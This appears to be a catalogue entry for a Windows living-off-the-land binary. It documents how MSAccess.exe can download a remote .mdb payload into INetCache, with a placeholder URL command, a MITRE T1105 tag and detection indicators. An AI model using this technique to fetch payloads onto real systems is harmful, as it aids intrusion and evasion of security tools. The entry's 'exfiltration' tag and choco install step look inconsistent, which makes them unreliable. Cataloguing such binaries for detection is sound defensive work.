---
id: windows-download-msaccess
namespace: windows:download:msaccess
name: msaccess
description: 'Microsoft Office component Located at: C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\MSAccess.exe; C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\MSAccess.exe; C:\Program Files (x86)\Microsoft Office\Office16\MSAccess.exe.'
author: Nir Chako
version: 1.0.0
capabilities:
- network.transfer.download
platforms:
- windows
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- msaccess
parameters: []
features: []
execution:
  template: msaccess
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Downloads payload from remote server (It will download a remote payload (if it has the filename extension .mdb) and place it in INetCache.)
  command: MSAccess.exe {REMOTEURL}
references: []
techniques:
- exfiltration
mitre_ids:
- T1105
detections:
- type: ioc
  description: URL on a MSAccess command line
- type: ioc
  description: MSAccess making unexpected network connections or DNS requests
install:
- method: choco
  package_name: msaccess
  commands:
  - choco install msaccess
---


# msaccess

msaccess is a Windows LOLBin. Microsoft Office component Located at: C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\MSAccess.exe; C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\MSAccess.exe; C:\Program Files (x86)\Microsoft Office\Office16\MSAccess.exe.
